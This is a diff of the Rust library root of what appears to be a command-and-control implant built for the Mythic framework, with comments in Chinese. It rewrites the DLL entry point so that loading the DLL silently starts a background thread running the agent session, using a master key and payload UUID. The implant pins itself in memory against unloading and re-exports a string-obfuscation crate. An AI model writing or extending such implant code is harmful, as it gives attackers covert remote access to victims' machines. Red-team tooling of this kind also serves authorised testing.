@@ -1,7 +1,3 @@
-// #![no_std]
-
-extern crate alloc;
-
 pub mod buffer;
 pub mod commands {
     pub mod file;
@@ -12,6 +8,7 @@ pub mod engine;
 pub mod error;
 pub mod protocol;
 pub mod sysinfo;
+pub mod stream;
 pub mod transfer;
 
 pub use obfstr;
@@ -22,34 +19,126 @@ pub mod profiles {
 }
 
 // =========================================================================
-// 统一从核心内存与缓冲区子系统 (buffer.rs) 重导出，对外提供稳定统一的 Facade 门面
+// 核心内存工作区与缓冲区规格显式门面重导出 (Facade 门面收敛，杜绝通配符命名空间污染)
 // =========================================================================
-pub use crate::buffer::*;
+pub use crate::buffer::{
+    ActiveStackWorkspace, DefaultStackWorkspace, StackVec,
+    ACTIVE_WIRE_SIZE, BUFFER_SIZE, MAX_B64_LEN, MAX_PLAINTEXT_LEN, MAX_RAW_LEN,
+};
 
 // 向后兼容模块别名与多桶调度器重导出
 pub use protocol as mythic_message_type;
 pub use protocol::DynamicBudget;
 
+// 顶层统一错误收敛门面导出
+pub use error::{WisconsinError, WisconsinResult};
+
+// 零堆纯栈流式传输与原生文件 I/O 门面重导出
+pub use stream::{MemorySliceReader, ZeroRead, ZeroSeek, ZeroWrite};
+#[cfg(windows)]
+pub use stream::NativeFileHandle;
+pub use transfer::{TransferReceiveSession, TransferRegisterMeta, TransferSession, TransferSource};
+
 // =========================================================================
-// 动态链接库出口 (Windows DLL Entrypoint)
+// 全局动态关停控制与 DLL 导出 (Global Dynamic Shutdown & DLL Entrypoint)
 // =========================================================================
+
+#[cfg(windows)]
+static SHUTDOWN_REQUESTED: core::sync::atomic::AtomicBool =
+    core::sync::atomic::AtomicBool::new(false);
+
+/// 查询是否收到了动态卸载或关停信号
+#[inline(always)]
+pub fn is_shutdown_requested() -> bool {
+    #[cfg(windows)]
+    {
+        SHUTDOWN_REQUESTED.load(core::sync::atomic::Ordering::Relaxed)
+    }
+    #[cfg(not(windows))]
+    {
+        false
+    }
+}
+
+/// 标记全局退出信号 (供 DllMain 或外部宿主调用)
+#[inline(always)]
+pub fn request_shutdown() {
+    #[cfg(windows)]
+    {
+        SHUTDOWN_REQUESTED.store(true, core::sync::atomic::Ordering::SeqCst);
+    }
+}
+
+#[cfg(windows)]
+unsafe extern "system" {
+    fn DisableThreadLibraryCalls(hLibModule: *mut core::ffi::c_void) -> i32;
+    fn GetModuleHandleExW(
+        dwFlags: u32,
+        lpModuleName: *const u16,
+        phModule: *mut *mut core::ffi::c_void,
+    ) -> i32;
+    fn FreeLibraryAndExitThread(hLibModule: *mut core::ffi::c_void, dwExitCode: u32) -> !;
+}
+
+#[cfg(windows)]
+const DLL_PROCESS_DETACH: u32 = 0;
+#[cfg(windows)]
+const DLL_PROCESS_ATTACH: u32 = 1;
+#[cfg(windows)]
+const GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS: u32 = 0x00000004;
+
 #[cfg(windows)]
 #[unsafe(no_mangle)]
 #[allow(non_snake_case)]
 pub extern "system" fn DllMain(
-    _hinst_dll: *mut core::ffi::c_void,
+    hinst_dll: *mut core::ffi::c_void,
     fdw_reason: u32,
-    _lpv_reserved: *mut core::ffi::c_void,
+    lpv_reserved: *mut core::ffi::c_void,
 ) -> i32 {
-    const DLL_PROCESS_ATTACH: u32 = 1;
-    if fdw_reason == DLL_PROCESS_ATTACH {
-        std::thread::spawn(|| {
-            let master_key = crate::config::AgentConfig::master_key();
-            let payload_uuid = crate::config::AgentConfig::payload_uuid_bytes();
-            if let Ok(mut session) = crate::engine::AgentSession::new(&master_key, &payload_uuid) {
-                session.run();
+    match fdw_reason {
+        DLL_PROCESS_ATTACH => {
+            // 1. 禁用线程级加载与卸载通知，杜绝频繁重入与线程退出时的 Loader Lock 潜在死锁
+            unsafe {
+                DisableThreadLibraryCalls(hinst_dll);
             }
-        });
+
+            // 2. 复位全局退出信号
+            SHUTDOWN_REQUESTED.store(false, core::sync::atomic::Ordering::SeqCst);
+
+            // 3. 启动后台主通信工作线程
+            std::thread::spawn(move || {
+                // 3.1 自持模块引用计数：防止宿主进程过早调用 FreeLibrary 解映射代码导致 0xC0000005
+                let mut self_module: *mut core::ffi::c_void = core::ptr::null_mut();
+                let has_pin = unsafe {
+                    GetModuleHandleExW(
+                        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
+                        DllMain as *const () as *const u16,
+                        &mut self_module,
+                    ) != 0
+                };
+
+                let master_key = crate::config::AgentConfig::master_key();
+                let payload_uuid = crate::config::AgentConfig::payload_uuid_bytes();
+                if let Ok(mut session) = crate::engine::AgentSession::new(&master_key, &payload_uuid) {
+                    session.run();
+                }
+
+                // 3.2 工作线程退出时：如果持有了本模块引用，原子释放引用并安全自杀退出
+                if has_pin && !self_module.is_null() {
+                    unsafe {
+                        FreeLibraryAndExitThread(self_module, 0);
+                    }
+                }
+            });
+        }
+        DLL_PROCESS_DETACH => {
+            // 严格区分：lpv_reserved == NULL 标识动态卸载 (FreeLibrary)，非 NULL 标识宿主进程整体退出 (ExitProcess)
+            if lpv_reserved.is_null() {
+                // 发出全局原子关停信号，通知 session.run 细粒度可中断休眠与主循环迅速安全退出
+                SHUTDOWN_REQUESTED.store(true, core::sync::atomic::Ordering::SeqCst);
+            }
+        }
+        _ => {}
     }
     1
 }
@@ -57,6 +146,7 @@ pub extern "system" fn DllMain(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::buffer::*;
 
     #[test]
     fn test_facade_constants_and_derivations() {
@@ -111,5 +201,15 @@ mod tests {
         assert_eq!(calc_padded_len(16), 32);
         assert_eq!(calc_raw_total(0), 84 + 16);
         assert_eq!(calc_raw_total(16), 84 + 32);
+    }
+
+    #[test]
+    fn test_shutdown_signal_lifecycle() {
+        assert!(!is_shutdown_requested());
+        request_shutdown();
+        assert!(is_shutdown_requested());
+        #[cfg(windows)]
+        SHUTDOWN_REQUESTED.store(false, core::sync::atomic::Ordering::SeqCst);
+        assert!(!is_shutdown_requested());
     }
 }
